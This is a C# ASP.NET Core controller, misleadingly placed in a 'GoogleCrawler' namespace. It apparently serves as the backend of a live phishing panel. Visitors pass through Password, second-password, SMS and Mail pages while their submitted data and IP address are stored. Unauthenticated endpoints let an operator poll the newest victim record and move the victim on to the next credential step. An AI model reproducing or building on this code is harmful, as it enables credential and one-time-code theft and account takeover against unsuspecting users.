using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using Microsoft.AspNetCore.Hosting;
using System.Globalization;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Cors;
using MongoDB.Driver;

namespace GoogleCrawler.Controllers
{

    [EnableCors("MyPolicy")]
    public class BaseController : Controller
    {
        private IUsersRepository _usersRepository;
        private IUnitOfWork _uow;


        IHttpContextAccessor _httpContextAccessor;
        IHostingEnvironment _IHostingEnvironment;

        public BaseController(
            IUsersRepository usersRepository, IUnitOfWork uow,
         IHttpContextAccessor _IHttpContextAccessor,
         IHostingEnvironment _IHostingEnvironment
            )
        {
            this._usersRepository = usersRepository;
            this._uow = uow;
            this._httpContextAccessor = _IHttpContextAccessor;
            this._IHostingEnvironment = _IHostingEnvironment;
        }

        public Users setUsers(Users postModel)
        {
            postModel.ipAdress = _httpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString();
            _httpContextAccessor.HttpContext.Session.Set("postmodel", postModel);
            ViewBag.users = postModel;
            return postModel;
        }

        public IActionResult Index()
        {
            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        [Route("getuser")]
        public async Task<IActionResult> getuser(string mail)
        {
            var row = _usersRepository.Where(o => o.mail == mail).Result.ToList().LastOrDefault();
            return Json(row);
        }

        [Route("settype")]
        public async Task<IActionResult> settype(string mail, stype stypeenum, string price)
        {
            var row = _usersRepository
              .Where(o => o.mail == mail && o.stype != stype.Ok)
              .Result.ToList().LastOrDefault();
            if (row != null)
            {
                row.stype = stype.Password2;

                if (!string.IsNullOrEmpty(price))
                    row.price = price;
                _usersRepository.Update(row);
                var res = await _uow.Commit();
                return Json(row);
            }
            else
            {
                return Json(null);
            }
        }



        [Route("getusers")]
        public async Task<IActionResult> getusers()
        {
            var row = _usersRepository
                .Where(o => o.stype != stype.Ok && o.stype != stype.Finish)
                .Result.ToList().LastOrDefault();
            if (row != null)
            {
                switch (row.stype)
                {
                    case stype.Password1:
                        {
                            //row.stype = stype.Password1;
                        }
                        break;
                    case stype.Password2:
                        {
                            //row.stype = stype.Password1;
                        }
                        break;
                    case stype.Sms:
                        {
                            //row.stype = stype.Password1;
                        }
                        break;
                    case stype.Mail:
                        {
                            //row.stype = stype.Password1;
                        }
                        break;
                    case stype.Wait:
                        {
                        }
                        break;
                    default:
                        {
                            //row.stype = stype.Password1;
                        }
                        break;
                }

                //_usersRepository.Update(row);
                //var res = await _uow.Commit();
            }

            return Json(row);
        }


        [Route("Password")]
        public IActionResult Password(Users postModel)
        {
            setUsers(postModel);
            return View();
        }

        [Route("Password2")]
        public IActionResult Password2()
        {
            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        [Route("Sms")]
        public IActionResult Sms()
        {
            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        [Route("SmsSend")]
        public IActionResult SmsSend(Users postModel)
        {
            setUsers(postModel);
            return View();
        }

        [Route("Mail")]
        public IActionResult Mail()
        {
            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        [Route("MailSend")]
        public IActionResult MailSend(Users postModel)
        {
            setUsers(postModel);
            return View();
        }

        [Route("Wait")]
        public async Task<IActionResult> Wait(Users postModel)
        {
            var result = setUsers(postModel);
            var row = _usersRepository.Where(o => o.mail == result.mail).Result.ToList().LastOrDefault();
            if (row != null)
                _usersRepository.Update(result);
            else
                _usersRepository.Add(result);

            var rs = await _uow.Commit();
            return View();
        }

        [Route("Finish")]
        public async Task<IActionResult> Finish(Users postModel)
        {
            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        [Route("Login")]
        public IActionResult Login(Users postModel)
        {
            var result = setUsers(postModel);
            return Json(result);
        }



    }



}


